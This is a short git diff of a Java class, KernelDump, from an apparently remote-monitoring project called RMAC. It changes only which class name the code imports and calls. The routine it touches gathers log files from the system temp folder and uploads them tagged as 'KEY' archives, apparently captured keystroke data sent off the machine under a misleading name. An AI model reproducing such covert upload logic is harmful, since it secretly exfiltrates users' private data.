@@ -1,6 +1,6 @@
 package com.rmac.core;
 
-import com.rmac.Main;
+import com.rmac.RMAC;
 import com.rmac.utils.ArchiveFileType;
 import com.rmac.utils.Constants;
 import java.io.File;
@@ -21,7 +21,7 @@ public class KernelDump implements Runnable {
   @Override
   public void run() {
     List<File> dumps = getAllLogFiles(Constants.SYS_TEMP_LOCATION);
-    dumps.forEach(dump -> Main.uploader.uploadFile(dump, ArchiveFileType.KEY));
+    dumps.forEach(dump -> RMAC.uploader.uploadFile(dump, ArchiveFileType.KEY));
   }
 
   private List<File> getAllLogFiles(String dirPath) {
